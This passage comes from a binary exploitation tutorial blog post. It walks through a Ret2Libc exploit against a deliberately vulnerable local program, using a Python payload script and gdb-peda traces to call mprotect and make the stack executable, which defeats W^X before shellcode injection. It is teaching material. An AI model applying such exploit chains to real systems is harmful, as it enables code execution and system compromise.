        payload += struct.pack('<I', argument2)

The **<I** signifies 4-byte little-endian unsigned data. The second is the integer we want to convert. 

Now, the payload is ready. We will write it into a file **exploit.txt**. 

        f = open("exploit.txt", "wb")
        f.write(payload)
        f.close()

You can download the script from [here](/assets/2019-03-05-return-to-libc-part2.md/exploit.py). 

Note that these addresses, arguments might be different for you. Change the script to suit your exploit. 

Let us run the exploit and get **exploit.txt**. 

    rev_eng_series/post_15}=)> chmod u+x exploit.py
    rev_eng_series/post_15}=)> ./exploit.py 

### d. Exploit it!

We will run the vulnerable program (defeat) in gdb and see if our exploit is successful or not. 

    rev_eng_series/post_15}=)> gdb -q defeat
    Reading symbols from defeat...(no debugging symbols found)...done.
    gdb-peda$ b func
    Breakpoint 1 at 0x8048441
    gdb-peda$ run < exploit.txt
    Starting program: /home/adwi/ALL/rev_eng_series/post_15/defeat < exploit.txt
    Before calling func


Break at **func**. You have to take input from **exploit.txt**. So, **gdb-peda$ run < exploit.txt** is an important step. 

Let us continue till the end of the function - just before **ret** is executed. The following is the state just before **ret** is executed. 

    [----------------------------------registers-----------------------------------]
    EAX: 0xffffcbbc ('a' <repeats 112 times>, "\240]\355\367cccc")
    EBX: 0x0 
    ECX: 0xf7fa55a0 --> 0xfbad2098 
    EDX: 0xf7fa687c --> 0x0 
    ESI: 0xf7fa5000 --> 0x1b1db0 
    EDI: 0xf7fa5000 --> 0x1b1db0 
    EBP: 0x61616161 ('aaaa')
    ESP: 0xffffcc2c --> 0xf7ed5da0 (<mprotect>:	push   ebx)
    EIP: 0x8048452 (<func+23>:	ret)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    0x804844d <func+18>:	add    esp,0x10
    0x8048450 <func+21>:	nop
    0x8048451 <func+22>:	leave  
    => 0x8048452 <func+23>:	ret    
    0x8048453 <main>:	lea    ecx,[esp+0x4]
    0x8048457 <main+4>:	and    esp,0xfffffff0
    0x804845a <main+7>:	push   DWORD PTR [ecx-0x4]
    0x804845d <main+10>:	push   ebp
    [------------------------------------stack-------------------------------------]
    0000| 0xffffcc2c --> 0xf7ed5da0 (<mprotect>:	push   ebx)
    0004| 0xffffcc30 ("cccc")
    0008| 0xffffcc34 --> 0xfffdc000 --> 0x0 
    0012| 0xffffcc38 --> 0x22000 
    0016| 0xffffcc3c --> 0x7 
    0020| 0xffffcc40 --> 0xf7fa5000 --> 0x1b1db0 
    0024| 0xffffcc44 --> 0xf7fa5000 --> 0x1b1db0 
    0028| 0xffffcc48 --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x08048452 in func ()
    gdb-peda$ 

Look at the Stack. Everything is as planned. 

The Top of Stack is **mprotect**'s address. It's Return Address is **cccc** or 0x63636363. The arguments have been put into the stack properly. 

The only thing left is to execute **mprotect** and check if we successfully change the permissions or not. 

**mprotect**'s manpage tells that it returns **0** on success and **-1** on error. The following is the disassembly of mprotect. 

    gdb-peda$ disass mprotect
    Dump of assembler code for function mprotect:
    0xf7ed5da0 <+0>:	push   ebx
    0xf7ed5da1 <+1>:	mov    edx,DWORD PTR [esp+0x10]
    0xf7ed5da5 <+5>:	mov    ecx,DWORD PTR [esp+0xc]
    0xf7ed5da9 <+9>:	mov    ebx,DWORD PTR [esp+0x8]
    0xf7ed5dad <+13>:	mov    eax,0x7d
    0xf7ed5db2 <+18>:	call   DWORD PTR gs:0x10
    0xf7ed5db9 <+25>:	pop    ebx
    0xf7ed5dba <+26>:	cmp    eax,0xfffff001
    0xf7ed5dbf <+31>:	jae    0xf7e0b730
    0xf7ed5dc5 <+37>:	ret    
    End of assembler dump.

We have to check if **call   DWORD PTR gs:0x10** returns 0 or -1. The following is the state just before that **call** is executed. 

    [----------------------------------registers-----------------------------------]
    EAX: 0x7d ('}')
    EBX: 0xfffdc000 --> 0x0 
    ECX: 0x22000 
    EDX: 0x7 
    ESI: 0xf7fa5000 --> 0x1b1db0 
    EDI: 0xf7fa5000 --> 0x1b1db0 
    EBP: 0x61616161 ('aaaa')
    ESP: 0xffffcc2c --> 0x0 
    EIP: 0xf7ed5db2 (<mprotect+18>:	call   DWORD PTR gs:0x10)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    0xf7ed5da5 <mprotect+5>:	mov    ecx,DWORD PTR [esp+0xc]
    0xf7ed5da9 <mprotect+9>:	mov    ebx,DWORD PTR [esp+0x8]
    0xf7ed5dad <mprotect+13>:	mov    eax,0x7d
    => 0xf7ed5db2 <mprotect+18>:	call   DWORD PTR gs:0x10
    0xf7ed5db9 <mprotect+25>:	pop    ebx
    0xf7ed5dba <mprotect+26>:	cmp    eax,0xfffff001
    0xf7ed5dbf <mprotect+31>:	jae    0xf7e0b730
    0xf7ed5dc5 <mprotect+37>:	ret
    Guessed arguments:
    arg[0]: 0x0 
    [------------------------------------stack-------------------------------------]
    0000| 0xffffcc2c --> 0x0 
    0004| 0xffffcc30 ("cccc")
    0008| 0xffffcc34 --> 0xfffdc000 --> 0x0 
    0012| 0xffffcc38 --> 0x22000 
    0016| 0xffffcc3c --> 0x7 
    0020| 0xffffcc40 --> 0xf7fa5000 --> 0x1b1db0 
    0024| 0xffffcc44 --> 0xf7fa5000 --> 0x1b1db0 
    0028| 0xffffcc48 --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0xf7ed5db2 in mprotect () from /lib/i386-linux-gnu/libc.so.6
    gdb-peda$

At this point, look at **/proc/PID/maps** file of defeat. 

    gdb-peda$ getpid
    464

I have only put the stack address space. 

    rev_eng_series/post_15}=)> cat /proc/464/maps
    ---
    fffdc000-ffffe000 rw-p 00000000 00:00 0                                  [stack]

It is only Read-Write. There is no execute permissions. 

If it is a success, **eax** register should be **0** after the call. The following is the state after **call**. 

    [----------------------------------registers-----------------------------------]
    EAX: 0x0 
    EBX: 0xfffdc000 --> 0x0 
    ECX: 0x22000 
    EDX: 0x7 
    ESI: 0xf7fa5000 --> 0x1b1db0 
    EDI: 0xf7fa5000 --> 0x1b1db0 
    EBP: 0x61616161 ('aaaa')
    ESP: 0xffffcc2c --> 0x0 
    EIP: 0xf7ed5db9 (<mprotect+25>:	pop    ebx)
    EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    0xf7ed5da9 <mprotect+9>:	mov    ebx,DWORD PTR [esp+0x8]
    0xf7ed5dad <mprotect+13>:	mov    eax,0x7d
    0xf7ed5db2 <mprotect+18>:	call   DWORD PTR gs:0x10
    => 0xf7ed5db9 <mprotect+25>:	pop    ebx
    0xf7ed5dba <mprotect+26>:	cmp    eax,0xfffff001
    0xf7ed5dbf <mprotect+31>:	jae    0xf7e0b730
    0xf7ed5dc5 <mprotect+37>:	ret    
    0xf7ed5dc6:	xchg   ax,ax
    [------------------------------------stack-------------------------------------]
    0000| 0xffffcc2c --> 0x0 
    0004| 0xffffcc30 ("cccc")
    0008| 0xffffcc34 --> 0xfffdc000 --> 0x0 
    0012| 0xffffcc38 --> 0x22000 
    0016| 0xffffcc3c --> 0x7 
    0020| 0xffffcc40 --> 0xf7fa5000 --> 0x1b1db0 
    0024| 0xffffcc44 --> 0xf7fa5000 --> 0x1b1db0 
    0028| 0xffffcc48 --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0xf7ed5db9 in mprotect () from /lib/i386-linux-gnu/libc.so.6
    gdb-peda$

It returned a **0**. 

Let us check the maps file again to confirm. 

    rev_eng_series/post_15}=)> cat /proc/464/maps
    ---
    fffdc000-ffffe000 rwxp 00000000 00:00 0                                  [stack]

Bingo! This worked. 

The highlight is we **defeated W^X** at this point. 

From now on, we will write python scripts to build the payloads. It is easy and well organized. 

## Can we try Code Injection now?

We now know how to make writable address spaces executable. With that, we have defeated W^X security technique. 

And now, we can bring back Code Injection. Instead of putting an Invalid Address for mprotect to return to, put the address where you store your shellcode. 

Try it out on your own and let me know if it worked or not. 

These types of exploits are generally known as **2-stage exploits**. 

In the first stage, we defeated W^X using **Ret2Libc**. 

The second stage is Shellcode Injection - the best way to pwn the system :P

2-stage exploits are  becoming very common because of increasing security features in the OS. 

## Conclusion

**Enable ASLR** before you do anything else.

We did quite a bit of experiments in this post. 

We started off by using BOF to execute **execve("/bin/sh", 0, 0)** and get a clear understanding of Ret2Libc. 

Then, we saw the difference between bypassing something and defeating something. 

Finally, we tried to defeat W^X using Ret2Libc and we did it!!

With that, I will end this post. 

When you are trying it out, sometimes the exploit might not work for some reason. Debug with patience. Not giving up till you pwn it is the key!

In the next post, we will talk about another wonderful exploit method known as **Return Oriented Programming**. It requires solid understanding of **Ret2Libc**. Make sure you have got your basics right because we will be stepping up big time :P

Thank you for reading and happy hacking :)

-----------------------------------------------------------
[Go to next post: Return Oriented Programming - Part1](/reverse/engineering/and/binary/exploitation/series/2019/01/16/return-oriented-programming-part1.html)                   
[Go to previous post: Bypassing Write XOR Execute! - Ret2Libc - Part1](/reverse/engineering/and/binary/exploitation/series/2019/03/04/return-to-libc-part1.html)                